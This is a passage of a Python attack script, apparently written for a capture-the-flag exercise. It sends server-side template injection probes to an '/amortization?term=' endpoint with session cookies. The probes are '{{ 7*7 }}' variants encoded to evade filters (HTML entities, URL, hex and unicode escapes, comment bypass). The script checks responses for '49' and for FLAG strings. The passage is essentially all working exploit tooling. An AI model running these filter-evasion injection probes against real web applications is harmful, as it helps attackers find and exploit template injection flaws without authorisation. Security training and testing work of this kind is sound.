    "4. HTML Entity Encoded": "&#123;&#123; 7*7 &#125;&#125;",
    "5. Mixed Encoding": urllib.parse.quote("&#123;&#123; 7*7 &#125;&#125;"),
    "6. Comment Bypass": "{# comment #}{{ 7*7 }}",
    "7. URL + Comment": urllib.parse.quote("{# comment #}{{ 7*7 }}"),
    "8. Hex Encoding": "%7B%7B%20%37%2A%37%20%7D%7D",
    "9. Unicode Escape": "\\u007B\\u007B 7*7 \\u007D\\u007D",
    "10. HTML Entity + URL": urllib.parse.quote("&#123;&#123; 7*7 &#125;&#125;")
}

print("="*80)
print("SSTI Payload Testing Against /amortization?term=")
print("="*80)

results = []

for test_name, payload in payloads.items():
    print(f"\n[TEST] {test_name}")
    print(f"[PAYLOAD] {payload}")
    
    try:
        # Make request with the payload
        url = f"{base_url}{endpoint}?term={payload}"
        response = requests.get(url, cookies=cookies, timeout=10)
        
        print(f"[STATUS] {response.status_code}")
        print(f"[LENGTH] {len(response.content)} bytes")
        
        # Check for flag in response
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group()}")
        
        # Check for SSTI execution indicators
        if "49" in response.text:
            print(f"[!] SSTI EXECUTED: Found '49' (7*7 result) in response")
        
        # Print response preview
        print(f"[RESPONSE PREVIEW] {response.text[:200]}...")
        
        results.append({
            'test': test_name,
            'payload': payload,
            'status': response.status_code,
            'length': len(response.content),
            'has_flag': bool(flag_match)
        })
        
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        results.append({
            'test': test_name,
            'payload': payload,
            'error': str(e)
        })

print("\n" + "="*80)
print("SUMMARY")
print("="*80)

status_codes = [r['status'] for r in results if 'status' in r]
print(f"Status code distribution: {set(status_codes)}")

for r in results:
    if 'status' in r:
        print(f"{r['test']}: {r['status']} ({r['length']}B)")
    else:
        print(f"{r['test']}: ERROR - {r['error']}")

